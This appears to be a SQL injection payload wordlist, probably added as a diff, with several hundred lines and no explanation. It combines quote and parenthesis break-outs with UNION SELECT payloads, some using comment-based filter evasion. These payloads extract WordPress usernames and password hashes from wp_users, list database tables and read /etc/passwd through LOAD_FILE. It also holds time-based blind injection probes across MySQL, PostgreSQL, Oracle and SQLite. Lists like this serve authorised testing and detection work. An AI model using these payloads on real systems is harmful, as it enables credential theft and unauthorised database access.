+-1 /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd'),2,3-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ CHAR(65,66,67),2,3-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ hex(user_pass) FROM wp_users-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ version(),schema(),current_user()-- 
+-1 UNION/*abc*/SELECT 1,2,3-- 
+-1 UNION/*abc*/SELECT NULL,NULL,NULL-- 
+-1 UNION/*abc*/SELECT user_login,user_pass FROM wp_users-- 
+-1 UNION/*abc*/SELECT @@version,user(),database()-- 
+-1 UNION/*abc*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+-1 UNION/*abc*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+-1 UNION/*abc*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+-1 UNION/*abc*/SELECT CHAR(65,66,67),2,3-- 
+-1 UNION/*abc*/SELECT hex(user_pass) FROM wp_users-- 
+-1 UNION/*abc*/SELECT version(),schema(),current_user()-- 
+-1 /**//*!12345UNION*/SELECT 1,2,3-- 
+-1 /**//*!12345UNION*/SELECT NULL,NULL,NULL-- 
+-1 /**//*!12345UNION*/SELECT user_login,user_pass FROM wp_users-- 
+-1 /**//*!12345UNION*/SELECT @@version,user(),database()-- 
+-1 /**//*!12345UNION*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+-1 /**//*!12345UNION*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+-1 /**//*!12345UNION*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+-1 /**//*!12345UNION*/SELECT CHAR(65,66,67),2,3-- 
+-1 /**//*!12345UNION*/SELECT hex(user_pass) FROM wp_users-- 
+-1 /**//*!12345UNION*/SELECT version(),schema(),current_user()-- 
+1' UNION SELECT 1,2,3-- 
+1' UNION SELECT NULL,NULL,NULL-- 
+1' UNION SELECT user_login,user_pass FROM wp_users-- 
+1' UNION SELECT @@version,user(),database()-- 
+1' UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1' UNION SELECT CHAR(65,66,67),2,3-- 
+1' UNION SELECT hex(user_pass) FROM wp_users-- 
+1' UNION SELECT version(),schema(),current_user()-- 
+1' UNION ALL SELECT 1,2,3-- 
+1' UNION ALL SELECT NULL,NULL,NULL-- 
+1' UNION ALL SELECT user_login,user_pass FROM wp_users-- 
+1' UNION ALL SELECT @@version,user(),database()-- 
+1' UNION ALL SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1' UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1' UNION ALL SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1' UNION ALL SELECT CHAR(65,66,67),2,3-- 
+1' UNION ALL SELECT hex(user_pass) FROM wp_users-- 
+1' UNION ALL SELECT version(),schema(),current_user()-- 
+1' UNION DISTINCT SELECT 1,2,3-- 
+1' UNION DISTINCT SELECT NULL,NULL,NULL-- 
+1' UNION DISTINCT SELECT user_login,user_pass FROM wp_users-- 
+1' UNION DISTINCT SELECT @@version,user(),database()-- 
+1' UNION DISTINCT SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1' UNION DISTINCT SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1' UNION DISTINCT SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1' UNION DISTINCT SELECT CHAR(65,66,67),2,3-- 
+1' UNION DISTINCT SELECT hex(user_pass) FROM wp_users-- 
+1' UNION DISTINCT SELECT version(),schema(),current_user()-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ @@version,user(),database()-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd'),2,3-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ CHAR(65,66,67),2,3-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ hex(user_pass) FROM wp_users-- 
+1' /*!50000UNION*/ /*!50000SELECT*/ version(),schema(),current_user()-- 
+1' UNION/*abc*/SELECT 1,2,3-- 
+1' UNION/*abc*/SELECT NULL,NULL,NULL-- 
+1' UNION/*abc*/SELECT user_login,user_pass FROM wp_users-- 
+1' UNION/*abc*/SELECT @@version,user(),database()-- 
+1' UNION/*abc*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1' UNION/*abc*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1' UNION/*abc*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1' UNION/*abc*/SELECT CHAR(65,66,67),2,3-- 
+1' UNION/*abc*/SELECT hex(user_pass) FROM wp_users-- 
+1' UNION/*abc*/SELECT version(),schema(),current_user()-- 
+1' /**//*!12345UNION*/SELECT 1,2,3-- 
+1' /**//*!12345UNION*/SELECT NULL,NULL,NULL-- 
+1' /**//*!12345UNION*/SELECT user_login,user_pass FROM wp_users-- 
+1' /**//*!12345UNION*/SELECT @@version,user(),database()-- 
+1' /**//*!12345UNION*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1' /**//*!12345UNION*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1' /**//*!12345UNION*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1' /**//*!12345UNION*/SELECT CHAR(65,66,67),2,3-- 
+1' /**//*!12345UNION*/SELECT hex(user_pass) FROM wp_users-- 
+1' /**//*!12345UNION*/SELECT version(),schema(),current_user()-- 
+1" UNION SELECT 1,2,3-- 
+1" UNION SELECT NULL,NULL,NULL-- 
+1" UNION SELECT user_login,user_pass FROM wp_users-- 
+1" UNION SELECT @@version,user(),database()-- 
+1" UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1" UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1" UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1" UNION SELECT CHAR(65,66,67),2,3-- 
+1" UNION SELECT hex(user_pass) FROM wp_users-- 
+1" UNION SELECT version(),schema(),current_user()-- 
+1" UNION ALL SELECT 1,2,3-- 
+1" UNION ALL SELECT NULL,NULL,NULL-- 
+1" UNION ALL SELECT user_login,user_pass FROM wp_users-- 
+1" UNION ALL SELECT @@version,user(),database()-- 
+1" UNION ALL SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1" UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1" UNION ALL SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1" UNION ALL SELECT CHAR(65,66,67),2,3-- 
+1" UNION ALL SELECT hex(user_pass) FROM wp_users-- 
+1" UNION ALL SELECT version(),schema(),current_user()-- 
+1" UNION DISTINCT SELECT 1,2,3-- 
+1" UNION DISTINCT SELECT NULL,NULL,NULL-- 
+1" UNION DISTINCT SELECT user_login,user_pass FROM wp_users-- 
+1" UNION DISTINCT SELECT @@version,user(),database()-- 
+1" UNION DISTINCT SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1" UNION DISTINCT SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1" UNION DISTINCT SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1" UNION DISTINCT SELECT CHAR(65,66,67),2,3-- 
+1" UNION DISTINCT SELECT hex(user_pass) FROM wp_users-- 
+1" UNION DISTINCT SELECT version(),schema(),current_user()-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ @@version,user(),database()-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd'),2,3-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ CHAR(65,66,67),2,3-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ hex(user_pass) FROM wp_users-- 
+1" /*!50000UNION*/ /*!50000SELECT*/ version(),schema(),current_user()-- 
+1" UNION/*abc*/SELECT 1,2,3-- 
+1" UNION/*abc*/SELECT NULL,NULL,NULL-- 
+1" UNION/*abc*/SELECT user_login,user_pass FROM wp_users-- 
+1" UNION/*abc*/SELECT @@version,user(),database()-- 
+1" UNION/*abc*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1" UNION/*abc*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1" UNION/*abc*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1" UNION/*abc*/SELECT CHAR(65,66,67),2,3-- 
+1" UNION/*abc*/SELECT hex(user_pass) FROM wp_users-- 
+1" UNION/*abc*/SELECT version(),schema(),current_user()-- 
+1" /**//*!12345UNION*/SELECT 1,2,3-- 
+1" /**//*!12345UNION*/SELECT NULL,NULL,NULL-- 
+1" /**//*!12345UNION*/SELECT user_login,user_pass FROM wp_users-- 
+1" /**//*!12345UNION*/SELECT @@version,user(),database()-- 
+1" /**//*!12345UNION*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1" /**//*!12345UNION*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1" /**//*!12345UNION*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1" /**//*!12345UNION*/SELECT CHAR(65,66,67),2,3-- 
+1" /**//*!12345UNION*/SELECT hex(user_pass) FROM wp_users-- 
+1" /**//*!12345UNION*/SELECT version(),schema(),current_user()-- 
+1) UNION SELECT 1,2,3-- 
+1) UNION SELECT NULL,NULL,NULL-- 
+1) UNION SELECT user_login,user_pass FROM wp_users-- 
+1) UNION SELECT @@version,user(),database()-- 
+1) UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1) UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1) UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1) UNION SELECT CHAR(65,66,67),2,3-- 
+1) UNION SELECT hex(user_pass) FROM wp_users-- 
+1) UNION SELECT version(),schema(),current_user()-- 
+1) UNION ALL SELECT 1,2,3-- 
+1) UNION ALL SELECT NULL,NULL,NULL-- 
+1) UNION ALL SELECT user_login,user_pass FROM wp_users-- 
+1) UNION ALL SELECT @@version,user(),database()-- 
+1) UNION ALL SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1) UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1) UNION ALL SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1) UNION ALL SELECT CHAR(65,66,67),2,3-- 
+1) UNION ALL SELECT hex(user_pass) FROM wp_users-- 
+1) UNION ALL SELECT version(),schema(),current_user()-- 
+1) UNION DISTINCT SELECT 1,2,3-- 
+1) UNION DISTINCT SELECT NULL,NULL,NULL-- 
+1) UNION DISTINCT SELECT user_login,user_pass FROM wp_users-- 
+1) UNION DISTINCT SELECT @@version,user(),database()-- 
+1) UNION DISTINCT SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1) UNION DISTINCT SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1) UNION DISTINCT SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1) UNION DISTINCT SELECT CHAR(65,66,67),2,3-- 
+1) UNION DISTINCT SELECT hex(user_pass) FROM wp_users-- 
+1) UNION DISTINCT SELECT version(),schema(),current_user()-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ @@version,user(),database()-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd'),2,3-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ CHAR(65,66,67),2,3-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ hex(user_pass) FROM wp_users-- 
+1) /*!50000UNION*/ /*!50000SELECT*/ version(),schema(),current_user()-- 
+1) UNION/*abc*/SELECT 1,2,3-- 
+1) UNION/*abc*/SELECT NULL,NULL,NULL-- 
+1) UNION/*abc*/SELECT user_login,user_pass FROM wp_users-- 
+1) UNION/*abc*/SELECT @@version,user(),database()-- 
+1) UNION/*abc*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1) UNION/*abc*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1) UNION/*abc*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1) UNION/*abc*/SELECT CHAR(65,66,67),2,3-- 
+1) UNION/*abc*/SELECT hex(user_pass) FROM wp_users-- 
+1) UNION/*abc*/SELECT version(),schema(),current_user()-- 
+1) /**//*!12345UNION*/SELECT 1,2,3-- 
+1) /**//*!12345UNION*/SELECT NULL,NULL,NULL-- 
+1) /**//*!12345UNION*/SELECT user_login,user_pass FROM wp_users-- 
+1) /**//*!12345UNION*/SELECT @@version,user(),database()-- 
+1) /**//*!12345UNION*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1) /**//*!12345UNION*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1) /**//*!12345UNION*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1) /**//*!12345UNION*/SELECT CHAR(65,66,67),2,3-- 
+1) /**//*!12345UNION*/SELECT hex(user_pass) FROM wp_users-- 
+1) /**//*!12345UNION*/SELECT version(),schema(),current_user()-- 
+1') UNION SELECT 1,2,3-- 
+1') UNION SELECT NULL,NULL,NULL-- 
+1') UNION SELECT user_login,user_pass FROM wp_users-- 
+1') UNION SELECT @@version,user(),database()-- 
+1') UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1') UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1') UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1') UNION SELECT CHAR(65,66,67),2,3-- 
+1') UNION SELECT hex(user_pass) FROM wp_users-- 
+1') UNION SELECT version(),schema(),current_user()-- 
+1') UNION ALL SELECT 1,2,3-- 
+1') UNION ALL SELECT NULL,NULL,NULL-- 
+1') UNION ALL SELECT user_login,user_pass FROM wp_users-- 
+1') UNION ALL SELECT @@version,user(),database()-- 
+1') UNION ALL SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1') UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1') UNION ALL SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1') UNION ALL SELECT CHAR(65,66,67),2,3-- 
+1') UNION ALL SELECT hex(user_pass) FROM wp_users-- 
+1') UNION ALL SELECT version(),schema(),current_user()-- 
+1') UNION DISTINCT SELECT 1,2,3-- 
+1') UNION DISTINCT SELECT NULL,NULL,NULL-- 
+1') UNION DISTINCT SELECT user_login,user_pass FROM wp_users-- 
+1') UNION DISTINCT SELECT @@version,user(),database()-- 
+1') UNION DISTINCT SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1') UNION DISTINCT SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1') UNION DISTINCT SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1') UNION DISTINCT SELECT CHAR(65,66,67),2,3-- 
+1') UNION DISTINCT SELECT hex(user_pass) FROM wp_users-- 
+1') UNION DISTINCT SELECT version(),schema(),current_user()-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ @@version,user(),database()-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd'),2,3-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ CHAR(65,66,67),2,3-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ hex(user_pass) FROM wp_users-- 
+1') /*!50000UNION*/ /*!50000SELECT*/ version(),schema(),current_user()-- 
+1') UNION/*abc*/SELECT 1,2,3-- 
+1') UNION/*abc*/SELECT NULL,NULL,NULL-- 
+1') UNION/*abc*/SELECT user_login,user_pass FROM wp_users-- 
+1') UNION/*abc*/SELECT @@version,user(),database()-- 
+1') UNION/*abc*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1') UNION/*abc*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1') UNION/*abc*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1') UNION/*abc*/SELECT CHAR(65,66,67),2,3-- 
+1') UNION/*abc*/SELECT hex(user_pass) FROM wp_users-- 
+1') UNION/*abc*/SELECT version(),schema(),current_user()-- 
+1') /**//*!12345UNION*/SELECT 1,2,3-- 
+1') /**//*!12345UNION*/SELECT NULL,NULL,NULL-- 
+1') /**//*!12345UNION*/SELECT user_login,user_pass FROM wp_users-- 
+1') /**//*!12345UNION*/SELECT @@version,user(),database()-- 
+1') /**//*!12345UNION*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1') /**//*!12345UNION*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1') /**//*!12345UNION*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1') /**//*!12345UNION*/SELECT CHAR(65,66,67),2,3-- 
+1') /**//*!12345UNION*/SELECT hex(user_pass) FROM wp_users-- 
+1') /**//*!12345UNION*/SELECT version(),schema(),current_user()-- 
+0' UNION SELECT 1,2,3-- 
+0' UNION SELECT NULL,NULL,NULL-- 
+0' UNION SELECT user_login,user_pass FROM wp_users-- 
+0' UNION SELECT @@version,user(),database()-- 
+0' UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+0' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+0' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+0' UNION SELECT CHAR(65,66,67),2,3-- 
+0' UNION SELECT hex(user_pass) FROM wp_users-- 
+0' UNION SELECT version(),schema(),current_user()-- 
+0' UNION ALL SELECT 1,2,3-- 
+0' UNION ALL SELECT NULL,NULL,NULL-- 
+0' UNION ALL SELECT user_login,user_pass FROM wp_users-- 
+0' UNION ALL SELECT @@version,user(),database()-- 
+0' UNION ALL SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+0' UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+0' UNION ALL SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+0' UNION ALL SELECT CHAR(65,66,67),2,3-- 
+0' UNION ALL SELECT hex(user_pass) FROM wp_users-- 
+0' UNION ALL SELECT version(),schema(),current_user()-- 
+0' UNION DISTINCT SELECT 1,2,3-- 
+0' UNION DISTINCT SELECT NULL,NULL,NULL-- 
+0' UNION DISTINCT SELECT user_login,user_pass FROM wp_users-- 
+0' UNION DISTINCT SELECT @@version,user(),database()-- 
+0' UNION DISTINCT SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+0' UNION DISTINCT SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+0' UNION DISTINCT SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+0' UNION DISTINCT SELECT CHAR(65,66,67),2,3-- 
+0' UNION DISTINCT SELECT hex(user_pass) FROM wp_users-- 
+0' UNION DISTINCT SELECT version(),schema(),current_user()-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ @@version,user(),database()-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd'),2,3-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ CHAR(65,66,67),2,3-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ hex(user_pass) FROM wp_users-- 
+0' /*!50000UNION*/ /*!50000SELECT*/ version(),schema(),current_user()-- 
+0' UNION/*abc*/SELECT 1,2,3-- 
+0' UNION/*abc*/SELECT NULL,NULL,NULL-- 
+0' UNION/*abc*/SELECT user_login,user_pass FROM wp_users-- 
+0' UNION/*abc*/SELECT @@version,user(),database()-- 
+0' UNION/*abc*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+0' UNION/*abc*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+0' UNION/*abc*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+0' UNION/*abc*/SELECT CHAR(65,66,67),2,3-- 
+0' UNION/*abc*/SELECT hex(user_pass) FROM wp_users-- 
+0' UNION/*abc*/SELECT version(),schema(),current_user()-- 
+0' /**//*!12345UNION*/SELECT 1,2,3-- 
+0' /**//*!12345UNION*/SELECT NULL,NULL,NULL-- 
+0' /**//*!12345UNION*/SELECT user_login,user_pass FROM wp_users-- 
+0' /**//*!12345UNION*/SELECT @@version,user(),database()-- 
+0' /**//*!12345UNION*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+0' /**//*!12345UNION*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+0' /**//*!12345UNION*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+0' /**//*!12345UNION*/SELECT CHAR(65,66,67),2,3-- 
+0' /**//*!12345UNION*/SELECT hex(user_pass) FROM wp_users-- 
+0' /**//*!12345UNION*/SELECT version(),schema(),current_user()-- 
+1 AND SLEEP(5)-- 
+1 AND SLEEP(0.5)-- 
+1 AND BENCHMARK(5000000,SHA1(1))-- 
+1 AND PG_SLEEP(5)-- 
+1 AND IF(1=1,SLEEP(5),0)-- 
+1 AND IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1 AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1 AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1 AND (SELECT SLEEP(5))-- 
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1 AND GET_LOCK('a',5)-- 
+1 AND RANDOMBLOB(500000000)-- 
+1 OR SLEEP(5)-- 
+1 OR SLEEP(0.5)-- 
+1 OR BENCHMARK(5000000,SHA1(1))-- 
+1 OR PG_SLEEP(5)-- 
+1 OR IF(1=1,SLEEP(5),0)-- 
+1 OR IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1 OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1 OR CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1 OR (SELECT SLEEP(5))-- 
+1 OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1 OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1 OR GET_LOCK('a',5)-- 
+1 OR RANDOMBLOB(500000000)-- 
+1' AND SLEEP(5)-- 
+1' AND SLEEP(0.5)-- 
+1' AND BENCHMARK(5000000,SHA1(1))-- 
+1' AND PG_SLEEP(5)-- 
+1' AND IF(1=1,SLEEP(5),0)-- 
+1' AND IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1' AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1' AND (SELECT SLEEP(5))-- 
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1' AND GET_LOCK('a',5)-- 
+1' AND RANDOMBLOB(500000000)-- 
+1' OR SLEEP(5)-- 
+1' OR SLEEP(0.5)-- 
+1' OR BENCHMARK(5000000,SHA1(1))-- 
+1' OR PG_SLEEP(5)-- 
+1' OR IF(1=1,SLEEP(5),0)-- 
+1' OR IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1' OR CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1' OR (SELECT SLEEP(5))-- 
+1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1' OR GET_LOCK('a',5)-- 
+1' OR RANDOMBLOB(500000000)-- 
+1" AND SLEEP(5)-- 
+1" AND SLEEP(0.5)-- 
+1" AND BENCHMARK(5000000,SHA1(1))-- 
+1" AND PG_SLEEP(5)-- 
+1" AND IF(1=1,SLEEP(5),0)-- 
+1" AND IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1" AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1" AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1" AND (SELECT SLEEP(5))-- 
+1" AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1" AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1" AND GET_LOCK('a',5)-- 
+1" AND RANDOMBLOB(500000000)-- 
+1" OR SLEEP(5)-- 
+1" OR SLEEP(0.5)-- 
+1" OR BENCHMARK(5000000,SHA1(1))-- 
+1" OR PG_SLEEP(5)-- 
+1" OR IF(1=1,SLEEP(5),0)-- 
+1" OR IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1" OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1" OR CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1" OR (SELECT SLEEP(5))-- 
+1" OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1" OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1" OR GET_LOCK('a',5)-- 
+1" OR RANDOMBLOB(500000000)-- 
+1) AND SLEEP(5)-- 
+1) AND SLEEP(0.5)-- 
+1) AND BENCHMARK(5000000,SHA1(1))-- 
+1) AND PG_SLEEP(5)-- 
+1) AND IF(1=1,SLEEP(5),0)-- 
+1) AND IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1) AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1) AND CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1) AND (SELECT SLEEP(5))-- 
+1) AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1) AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1) AND GET_LOCK('a',5)-- 
+1) AND RANDOMBLOB(500000000)-- 
+1) OR SLEEP(5)-- 
+1) OR SLEEP(0.5)-- 
+1) OR BENCHMARK(5000000,SHA1(1))-- 
+1) OR PG_SLEEP(5)-- 
+1) OR IF(1=1,SLEEP(5),0)-- 
+1) OR IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1) OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
+1) OR CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END-- 
+1) OR (SELECT SLEEP(5))-- 
+1) OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- 
+1) OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- 
+1) OR GET_LOCK('a',5)-- 
+1) OR RANDOMBLOB(500000000)-- 
+1') AND SLEEP(5)-- 
+1') AND SLEEP(0.5)-- 
+1') AND BENCHMARK(5000000,SHA1(1))-- 
+1') AND PG_SLEEP(5)-- 
+1') AND IF(1=1,SLEEP(5),0)-- 
+1') AND IF(SUBSTR(version(),1,1)='8',SLEEP(5),0)-- 
+1') AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- 
